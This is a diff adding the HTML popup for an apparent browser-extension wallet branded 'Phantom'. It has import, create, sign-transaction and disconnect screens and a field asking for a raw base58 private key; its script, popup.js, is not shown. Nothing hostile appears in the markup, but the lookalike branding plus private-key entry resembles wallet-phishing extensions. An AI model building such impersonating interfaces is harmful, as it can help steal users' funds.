@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    body { width: 400px; height: 600px; margin: 0; padding: 20px; font-family: Arial, sans-serif; }
+    .container { display: flex; flex-direction: column; height: 100%; }
+    .header { text-align: center; margin-bottom: 20px; }
+    .logo { width: 40px; height: 40px; background: #AB9FF2; border-radius: 50%; margin: 0 auto 10px; }
+    .button { background: #AB9FF2; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; margin: 10px 0; }
+    .button:hover { background: #9B8FF2; }
+    .input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin: 10px 0; box-sizing: border-box; }
+    .hidden { display: none; }
+    .status { text-align: center; margin: 10px 0; }
+    .connected { color: green; }
+    .error { color: red; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo"></div>
+      <h2>Phantom</h2>
+    </div>
+    
+    <div id="welcome-screen">
+      <button class="button" onclick="showImport()">Import Existing Wallet</button>
+      <button class="button" onclick="createWallet()">Create New Wallet</button>
+    </div>
+    
+    <div id="import-screen" class="hidden">
+      <h3>Import Wallet</h3>
+      <textarea id="private-key" class="input" placeholder="Enter your private key (base58)" rows="3"></textarea>
+      <input id="password" class="input" type="password" placeholder="Create password">
+      <button class="button" onclick="importWallet()">Import Wallet</button>
+      <button class="button" onclick="showWelcome()">Back</button>
+    </div>
+    
+    <div id="wallet-screen" class="hidden">
+      <div class="status connected">✅ Wallet Connected</div>
+      <p>Public Key: <span id="public-key"></span></p>
+      <button class="button" onclick="signTransaction()">Sign Transaction</button>
+      <button class="button" onclick="disconnect()">Disconnect</button>
+    </div>
+    
+    <div id="status"></div>
+  </div>
+
+  <script src="popup.js"></script>
+</body>
+</html>
